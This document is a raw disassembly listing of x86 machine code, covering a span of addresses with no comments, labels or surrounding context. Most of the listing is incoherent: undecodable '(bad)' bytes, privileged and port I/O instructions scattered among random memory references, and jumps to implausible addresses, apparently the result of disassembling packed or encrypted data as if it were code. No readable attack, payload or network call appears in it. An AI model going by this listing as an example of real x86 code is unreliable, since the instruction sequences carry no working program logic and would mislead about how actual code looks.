  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
